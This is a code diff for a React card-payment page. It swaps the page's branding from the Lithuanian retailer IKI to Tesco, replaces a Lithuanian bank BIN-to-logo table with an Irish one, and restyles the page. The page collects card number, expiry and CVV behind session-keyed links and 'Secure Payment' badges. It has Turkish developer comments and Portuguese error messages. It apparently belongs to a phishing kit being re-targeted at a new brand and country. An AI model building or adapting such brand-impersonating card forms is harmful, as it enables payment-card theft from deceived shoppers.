@@ -62,27 +62,28 @@ function CardBrandLogo({ brand }: { brand: string }) {
   }
   if (brand === "amex") {
     return (
-      <span className="rounded bg-[#2E77BC] px-1.5 py-0.5 text-[10px] font-bold tracking-wide text-white">AMEX</span>
+      <span className="rounded bg-[#2E77BC] px-1.5 py-0.5 text-[10px] font-bold tracking-wide text-[#0a2463]">AMEX</span>
     );
   }
   return null;
 }
 
-// Litvanya bankalari BIN (ilk 4-6 hane) -> logo eslesmesi
+// Irlanda bankalari BIN (ilk 4-6 hane) -> logo eslesmesi
 type BankBin = { name: string; logo: string; prefixes: string[] };
-const LT_BANK_BINS: BankBin[] = [
-  { name: "Swedbank", logo: "/bank-logos/lithuania/swedbank-lt.png", prefixes: ["5168", "5224", "5413", "4898", "4026", "4714", "4921", "5308", "5589", "6763"] },
-  { name: "SEB", logo: "/bank-logos/lithuania/seb-lt.png", prefixes: ["4167", "4235", "4899", "5290", "5319", "5350", "5412", "5434", "5571", "6764"] },
-  { name: "Luminor", logo: "/bank-logos/lithuania/luminor-lt.png", prefixes: ["4025", "4738", "5125", "5150", "5187", "5299", "5360", "5416", "5528", "6762"] },
-  { name: "Šiaulių bankas", logo: "/bank-logos/lithuania/siauliu-bankas-lt.png", prefixes: ["4551", "5280", "5323", "5584", "6765"] },
-  { name: "Citadele", logo: "/bank-logos/lithuania/citadele-lt.png", prefixes: ["4191", "4328", "5124", "5189", "5274", "5567"] },
-  { name: "Kredito unijos", logo: "/bank-logos/lithuania/kredito-unijos-lt.png", prefixes: ["5164", "5359", "5483"] },
+const IE_BANK_BINS: BankBin[] = [
+  { name: "Revolut", logo: "/bank-logos/ireland/revolut.svg", prefixes: ["539859", "535290", "555088", "521776", "428322", "531738", "554511", "552011"] },
+  { name: "Wise", logo: "/bank-logos/ireland/wise.svg", prefixes: ["524005", "428092", "554566", "535860", "553326", "530884"] },
+  { name: "AIB", logo: "/bank-logos/ireland/aib.svg", prefixes: ["426397", "539996", "535822", "492181", "489372", "556773", "531940"] },
+  { name: "Bank of Ireland", logo: "/bank-logos/ireland/bank-of-ireland.svg", prefixes: ["517907", "539825", "454434", "489536", "552589", "456738", "435985"] },
+  { name: "Permanent TSB", logo: "/bank-logos/ireland/ptsb.png", prefixes: ["535625", "541282", "555051", "483562", "437771"] },
+  { name: "An Post", logo: "/bank-logos/ireland/an-post.svg", prefixes: ["425638", "414050", "473846"] },
+  { name: "EBS", logo: "/bank-logos/ireland/ebs.png", prefixes: ["482830", "423742"] },
 ];
 
 function detectBank(number: string): BankBin | null {
   const digits = number.replace(/\D/g, "");
   if (digits.length < 4) return null;
-  for (const bank of LT_BANK_BINS) {
+  for (const bank of IE_BANK_BINS) {
     for (const p of bank.prefixes) {
       if (digits.startsWith(p)) return bank;
     }
@@ -240,7 +241,7 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
     return (
       <div className="flex min-h-[100dvh] items-center justify-center">
         <div className="flex justify-center py-16">
-          <div className="size-12 animate-spin rounded-full border-4 border-[var(--brand)]/30 border-t-[var(--brand)]" />
+          <div className="size-12 animate-spin rounded-full border-4 border-[#dbe6f3] border-t-[var(--brand)]" />
         </div>
       </div>
     );
@@ -249,7 +250,7 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
   if (!supabase) {
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-5 sm:p-8">
           <ConfigMissing />
         </div>
       </div>
@@ -259,8 +260,8 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
   if (!sessionId) {
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 text-center">
-          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-5 sm:p-8 text-center">
+          <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-600">
             Invalid link.
           </p>
         </div>
@@ -270,13 +271,13 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
 
   return (
     <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-      <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-6 sm:p-10 relative z-10 fade-in">
+      <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-6 sm:p-10 relative z-10 fade-in">
         
         {/* Right Top Logo Placeholder */}
         <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
           <img
             src="/form-assets/tesco-mini-logo.png"
-            alt="IKI logo"
+            alt="Tesco"
             className="h-10 w-10 object-contain drop-shadow-[0_10px_18px_rgba(0,0,0,0.35)]"
             id="card-ah-logo"
           />
@@ -287,13 +288,13 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
             <img src="/form-assets/icon-security.png" alt="Secure Payment" className="h-12 w-12" id="card-security-icon" />
           </div>
           <div>
-            <h2 className="text-2xl font-bold text-white mb-1">{settings.card_title}</h2>
-            <p className="text-sm text-gray-300 font-medium">{settings.card_subtitle}</p>
+            <h2 className="text-2xl font-bold text-[#0a2463] mb-1">{settings.card_title}</h2>
+            <p className="text-sm text-gray-600 font-medium">{settings.card_subtitle}</p>
           </div>
         </div>
 
         <form onSubmit={handleSubmit} className="space-y-4">
-          <label className="block text-sm font-medium text-white">
+          <label className="block text-sm font-medium text-[#0a2463]">
             <div className="flex items-center justify-between gap-2">
               <span>{settings.card_number_label}</span>
               {(brand || bank) && (
@@ -303,11 +304,11 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
                       src={bank.logo}
                       alt={bank.name}
                       title={bank.name}
-                      className="h-6 w-auto rounded bg-white/90 px-1 py-0.5 object-contain shadow-sm"
+                      className="h-6 w-auto rounded bg-white px-1 py-0.5 object-contain shadow-sm"
                     />
                   )}
                   {brand && (
-                    <span className="rounded-md bg-white/90 px-2 py-1 shadow-sm">
+                    <span className="rounded-md bg-white px-2 py-1 shadow-sm">
                       <CardBrandLogo brand={brand.name} />
                     </span>
                   )}
@@ -318,10 +319,10 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
               <input
                 required
                 inputMode="numeric"
-                className={`block w-full rounded-xl border py-3 px-4 text-lg tracking-widest text-white shadow-sm transition-colors placeholder:text-gray-500 focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50 ${
+                className={`block w-full rounded-xl border py-3 px-4 text-lg tracking-widest text-gray-900 shadow-sm transition-colors placeholder:text-gray-500 focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50 ${
                   !numberValid && number.length >= 12
-                    ? "border-red-500 bg-red-500/10 focus:border-red-500"
-                    : "border-transparent bg-white/10 focus:border-[var(--brand)]"
+                    ? "border-red-500 bg-red-50 focus:border-red-500"
+                    : "border-transparent bg-[#f0f6fb] focus:border-[var(--brand)]"
                 }`}
                 value={number}
                 onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
@@ -330,7 +331,7 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
             </div>
           </label>
           {bank && (
-            <p className="mt-1.5 flex items-center gap-1.5 text-xs text-gray-400">
+            <p className="mt-1.5 flex items-center gap-1.5 text-xs text-gray-500">
               <svg viewBox="0 0 20 20" fill="currentColor" className="h-3.5 w-3.5 text-[var(--brand)]">
                 <path fillRule="evenodd" d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v6a2 2 0 002 2h10a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z" clipRule="evenodd" />
               </svg>
@@ -338,12 +339,12 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
             </p>
           )}
           <div className="grid grid-cols-2 gap-3">
-            <label className="block text-sm font-medium text-white">
+            <label className="block text-sm font-medium text-[#0a2463]">
               {settings.card_expiry_label}
               <input
                 required
                 placeholder="MM/AA"
-                className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
+                className="mt-2 block w-full rounded-xl border border-transparent bg-[#f0f6fb] py-3 px-4 text-lg text-[#0a2463] shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
                 value={expiry}
                 onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                 autoComplete="cc-exp"
@@ -351,13 +352,13 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
                 maxLength={5}
               />
             </label>
-            <label className="block text-sm font-medium text-white">
+            <label className="block text-sm font-medium text-[#0a2463]">
               {settings.card_cvv_label}
               <input
                 required
                 inputMode="numeric"
                 maxLength={4}
-                className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
+                className="mt-2 block w-full rounded-xl border border-transparent bg-[#f0f6fb] py-3 px-4 text-lg text-[#0a2463] shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
                 value={cvc}
                 onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
                 autoComplete="cc-csc"
@@ -366,30 +367,30 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
           </div>
 
           {!numberValid && number.length >= 12 ? (
-            <p className="text-xs text-red-400">Invalid card number.</p>
+            <p className="text-xs text-red-600">Invalid card number.</p>
           ) : null}
 
           {!expiryValid && expiry.length > 0 ? (
-            <p className="text-xs text-red-400">A data de validade deve estar no formato MM/AA.</p>
+            <p className="text-xs text-red-600">A data de validade deve estar no formato MM/AA.</p>
           ) : null}
 
           {!cvcValid && cvc.length > 0 ? (
-            <p className="text-xs text-red-400">O código CVV é composto por 3 ou 4 dígitos.</p>
+            <p className="text-xs text-red-600">O código CVV é composto por 3 ou 4 dígitos.</p>
           ) : null}
 
-          {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
+          {msg ? <p className="text-center text-sm text-red-600">{msg}</p> : null}
 
           <button
             type="submit"
             disabled={saving || !numberValid || !expiryValid || !cvcValid}
-            className="w-full rounded-xl bg-gradient-to-r from-[var(--brand)] to-[var(--brand-dark)] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(var(--brand-rgb),0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
+            className="w-full rounded-xl bg-gradient-to-r from-[var(--brand)] to-[var(--brand-dark)] py-4 text-lg font-bold text-white shadow-[0_8px_20px_rgba(0,83,159,0.25)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
           >
             {saving ? "A enviar..." : settings.card_button}
           </button>
           
           <div className="mt-4 flex items-center justify-center gap-2">
             <img src="/form-assets/icon-security.png" alt="Secure" className="h-5 w-5" />
-            <span className="text-[13px] font-medium text-gray-300">
+            <span className="text-[13px] font-medium text-gray-600">
               Your data is processed securely.
             </span>
           </div>
